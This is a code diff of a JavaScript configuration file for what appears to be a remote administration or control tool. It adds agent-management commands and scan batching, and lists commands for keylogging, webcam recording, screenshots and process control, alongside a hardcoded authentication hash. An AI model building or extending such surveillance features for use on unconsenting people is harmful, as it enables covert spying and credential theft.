@@ -1,7 +1,8 @@
 export const CONFIG = {
     SERVER_PORT: 8080,
     AUTH_HASH: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
-    
+    LOCAL_STORAGE_ID_KEY: 'client_machine_id',
+
     CMD: {
         PING: "ping",
         PONG: "pong",
@@ -18,7 +19,7 @@ export const CONFIG = {
         PROC_START: "STARTPROC",
         PROC_KILL: "STOPPROC",
 
-        CAM_RECORD: "CAM_RECORD",
+        CAM_RECORD: "cam_record",
         SCREENSHOT: "SCRSHOT",
         START_KEYLOG: "STARTKLOG",
         STOP_KEYLOG: "STOPKLOG",
@@ -27,7 +28,12 @@ export const CONFIG = {
         RESTART: "restart",
 
         ECHO: "echo",
-        WHOAMI: "whoami"
+        WHOAMI: "whoami",
+
+        GET_AGENTS: "get_agents",
+        AGEN_STATUS: "agent_status",
+        CONNECT_AGENT: "connect_agent"
     },
-    SCAN_TIMEOUT: 2000
+    SCAN_TIMEOUT: 1500,
+    SCAN_BATCH_SIZE: 30
 };
